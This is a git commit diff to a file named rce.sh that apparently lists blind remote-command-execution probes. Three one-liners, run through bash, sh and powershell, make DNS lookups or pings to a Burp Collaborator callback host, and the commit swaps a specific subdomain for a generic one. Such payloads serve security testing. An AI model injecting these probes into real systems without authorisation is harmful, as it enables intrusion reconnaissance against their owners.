cb786e0c4a060aa14533a679fa4af2f7b712ecdd
Yassine Bourki <76617694+YaS5in3@users.noreply.github.com>
2022-11-01 10:30:06 +0100

    Update rce.sh

--- rce.sh
+++ rce.sh
@@ -1,3 +1,3 @@
-bash -c "nslookup gm6mkkpfv74dhr4d3tr0h6d9g0mtai.burpcollaborator.net"
-sh -c "nslookup gm6mkkpfv74dhr4d3tr0h6d9g0mtai.burpcollaborator.net"
-powershell -c "ping gm6mkkpfv74dhr4d3tr0h6d9g0mtai.burpcollaborator.net"
+bash -c "nslookup burp.burpcollaborator.net"
+sh -c "nslookup burp.burpcollaborator.net"
+powershell -c "ping burp.burpcollaborator.net"
